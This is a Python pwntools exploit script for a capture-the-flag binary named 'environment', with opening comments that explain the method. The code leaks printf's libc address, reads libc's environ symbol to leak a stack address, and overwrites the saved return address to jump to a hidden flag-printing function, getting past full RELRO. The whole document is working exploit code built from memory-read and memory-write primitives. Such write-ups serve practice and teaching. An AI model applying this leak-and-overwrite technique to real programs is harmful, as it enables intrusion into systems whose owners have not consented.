#!/usr/bin/env python3
#A really cool challenge from this CTF... Except PIE there were all other exploit mitigations turned on..
#Bugs in hand Memory overwrite and Memory read but a big problem FULL RELRO which reduces all the chances to jump..
#Using these two bugs in a perfect way .. We have a function present in binary that print flag.. 
#We should return to that function..But no format string or bufferoverflows with FULLRELRO ..HOw to do it..
#I really don't know that .. while searching i found a really cool git https://github.com/Naetw/CTF-pwn-tip
#Where there is a way to leak stack addresses ..And i used the same way to leak stack address and overwrite the return address
#and made my way to the function that gives the flag...
#After recycling 5 times with not first time as option...The binary gives the printf libc address  
#And then 5 more times ..There is a prompt where we can give any address to leak its memory contents..
#According to the blog there is a function in libc called environ...Which holds the location of environment variables..
#Calculate the distance between this environ leak with the return address and using the plant function overwrite.
#finally overwrite the stack return address with the Hidden resources function to get the flag..



from pwn import *
from time import sleep
import sys

e = ELF("./environment")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#libc = ELF("./libc.so.6")
r = process("./environment")
#r = remote("139.59.189.95",31094) 
i = 0
exploit = '2\n' + '2\n' + 'n\n'
while(i < 5):
    r.send(exploit)
    sleep(0.2)
    i+=1
r.recvuntil(b'Please accept this gift: \x1b[0m[')
libc_leak = int(r.recvline().rstrip(b"]\n"),16)
libc_base = libc_leak - libc.sym["printf"]
libc_environ = str(libc_base + libc.sym["environ"])
log.info("The printf address on libc which we got after performing 5 recycle is " + hex(libc_base))
while(i < 10):
    r.send(exploit)
    sleep(0.2)
    i+=1
r.recvuntil(b"whatever you want.\n")
r.send(libc_environ)
r.recvuntil(b"> \x1b[0m")
stack_address = u64(r.recvline().rstrip().decode('latin-1').ljust(8,"\x00"))
log.info("THe leaked stack address is " + hex(stack_address))
return_address = stack_address - 0x130
log.info("The return address found from performing calculation on the leaked stack address is " + hex(return_address))
exploit = '1\n'
r.send(exploit)
sleep(0.3)
exploit = str(return_address) 
r.send(exploit)
sleep(0.3)
exploit = b'4198581'
r.send(exploit)
sleep(0.3)
while(True):
    sleep(0.2)
    try:
        print(r.recvline())
    except EOFError:
        r.close()
        sys.exit()
